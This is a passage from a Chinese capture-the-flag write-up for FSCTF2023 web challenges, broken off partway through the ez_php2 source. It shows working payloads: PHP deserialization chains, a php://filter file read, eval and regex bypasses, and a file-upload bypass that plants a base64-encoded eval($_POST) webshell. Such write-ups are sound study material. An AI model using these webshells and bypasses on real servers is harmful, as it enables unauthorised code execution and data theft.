property\">b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>@<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>可以看到 flag 在变量 a 中，但我们能控制得只有 b，且只能输出 b，那就用引用的方法让两者地址相等：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Clazz</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//$d=\"YES I love\";</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Clazz</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">//echo serialize($d);</span></span></pre></td></tr></table></figure><blockquote s:1:a;N;s:1:b;R:2;=\"\">\n<p>data=O:5:&quot;Clazz&quot;:2:</p>\n</blockquote>\n<p>base64 解码后即可得到 flag。</p>\n<h3 id=\"巴巴托斯\"><a class=\"anchor\" href=\"#巴巴托斯\">#</a> 巴巴托斯！</h3>\n<p>进入后看到：</p>\n<p>Access Denied! I love FSCTF Browser</p>\n<p>修改 User-Agent 为 FSCTF Browser</p>\n<p>Access Denied! Are you local man?</p>\n<p>添加：</p>\n<p>Referer:127.0.0.1</p>\n<p>没有结果回显，那八成可以了，找一下注入点，发现这里</p>\n<p>/index.php?file=show_image.php</p>\n<p>应该可以进行 ssrf，</p>\n<blockquote>\n<p>?file=php://filter/convert.base64-encode/resource=flag.php</p>\n</blockquote>\n<p>base64 解码即可。</p>\n<h3 id=\"ez_eval\"><a class=\"anchor\" href=\"#ez_eval\">#</a> EZ_eval</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'word'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$word</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'word'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|tac|tail|more|head|nl|flag|less| /\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$word</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>       <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nonono.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$word</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"?\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$word</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"?>\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$word</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤了空格，那就用 tab 符绕过，又把 '?' 给替换成空，那就用不了 php 段标签，用 javascript 标签。</p>\n<p>payload:</p>\n<blockquote>\n<p>?word=&lt;script%09language=&quot;php&quot;&gt;@eval($_REQUEST['a']);&lt;/script&gt;</p>\n<p>a=cat /fl*</p>\n</blockquote>\n<p>得到 flag。</p>\n<h3 id=\"cancanneed\"><a class=\"anchor\" href=\"#cancanneed\">#</a> CanCanNeed</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Noteasy</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$param1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$param2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">param1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">param2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|\\.|log|scan|chr|local|sess|b2|id|show|cont|high|reverse|flip|rand|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|y2f/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">param2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'this param is error!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hi!Welcome to FSCTF2023!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Hi!Welcome to FSCTF2023!</pre></td></tr></table></figure><p>看到<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><msup><mo stretchy=\"false\">(</mo><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">a(&#x27;&#x27;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mopen\"><span class=\"mopen\">(</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span></span></span></span>b) 就可以想到 create_function，接下来就是绕过正则，payload:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Noteasy</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$param1</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"create_function\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$param2</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'&#125;require(base64_decode(ZmlsZTovLy9mbGFn));#'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Noteasy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>传参即可拿到 flag。</p>\n<h3 id=\"是兄弟就来传你の\"><a class=\"anchor\" href=\"#是兄弟就来传你の\">#</a> 是兄弟，就来传你の🐎！</h3>\n<p>题目让我们：Upload a PHP File for FSCTF</p>\n<p>尝试上传 php 文件，提示：</p>\n<p>not allowed!</p>\n<p>上传一张图片，提示长度不能大于等于 15，</p>\n<p>后把文件内容改短一点，看到是会校验文件内容的:</p>\n<p>File is not an image!</p>\n<p>常用的文件头可以绕过，如 <code>GIF89A</code></p>\n<p>再测测文件名，发现 <code>php</code>  后缀是会拦截，可以用 pht 绕过。</p>\n<p>因为限制了长度，所以使用 <code>php短标签</code> ， <code>php标签</code> 不闭合也能执行，可以尽可能缩短内容长度</p>\n<p>测试发现，发现 <code>BM</code>  可用</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/7.png\" alt=\"6\" /></p>\n<p>访问得到：</p>\n<blockquote>\n<p>BM bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p>\n</blockquote>\n<p>于是研究起 linux 命令，发现 <code>sh -c *</code>  可以让<strong>当前目录的文件名作为命令执行</strong></p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d >1.pht<span class=\"token punctuation\">;</span>.pht</pre></td></tr></table></figure><blockquote>\n<p>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;3.pht&quot;<br />\nContent-Type: image/jpeg</p>\n<p>BM<br />\n&lt;?=`sh -c *`;</p>\n</blockquote>\n<p>再访问一下上传命令的 <code>1.pht</code> ，200 访问成功</p>\n<p>然后就拿个 webshell 连接工具就行了，密码是 1.</p>\n<h3 id=\"寻找蛛丝马迹\"><a class=\"anchor\" href=\"#寻找蛛丝马迹\">#</a> 寻找蛛丝马迹</h3>\n<p>wp 一共有六段，F12 打开开发者工具后，可以在源代码 html,js,css 三个文件中看到前三段，</p>\n<blockquote>\n<p>&lt;!-- 挺晃眼睛吧，哥们出题时候都快瞎了。恭喜您，这是第一段 flag:FSCTF {Tell_y0U_n, 第二段您还得接着翻 --&gt;</p>\n</blockquote>\n<blockquote>\n<p>/* 这是第二段哦：oT_To_p 想必阁下已经猜到第三段在哪了吧 */</p>\n</blockquote>\n<blockquote>\n<p>// 这是第三段：oInT_oUt_ 阁下当真有水平。既然如此，哥们要上难度了。第四段提示：我不想让谷歌搜到我的网站。</p>\n</blockquote>\n<p>后面三段使用目录扫描工具进行扫描，可以扫到三个文件：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/8.png\" alt=\"6\" /></p>\n<p>后面三段就在这三个文件中。</p>\n<h3 id=\"签到plus\"><a class=\"anchor\" href=\"#签到plus\">#</a> 签到 plus</h3>\n<p>用 dirsearch 等扫描工具扫到文件 shell.php，进入界面是 phpinfo (); 函数执行界面。</p>\n<p>本题的考点就是：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMjM1Njkx\">PHP＜=7.4.21 Development Server 源码泄露漏洞</span></p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/10.png\" alt=\"10\" /></p>\n<p>记得关闭 content-length 更新。</p>\n<p>然后就是读出 hex 码得到 webshell 密码：</p>\n<blockquote>\n<p>/shell.php?%f0%9f%91%bd%f0%9f%a6%90=cat /fl*</p>\n</blockquote>\n<h3 id=\"ez_php2\"><a class=\"anchor\" href=\"#ez_php2\">#</a> ez_php2</h3>\n<p>题目源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">Class</span> <span class=\"token class-name-definition class-name\">Rd</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ending</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cl</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$poc</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"All matters have concluded\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ending</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$arg</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'POC'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"1111\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cl</span><span class=\"token operator\">-></span><span class=\"token property\">var1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Poc</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$payload</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$fun</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">payload</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">fun</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getflag</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$paylaod</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Have you genuinely accomplished what you set out to do?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$paylaod</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Er</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$symbol</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$Flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">symbol</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token variable\">$value</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">Flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Ha</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">start1</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"__construct\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 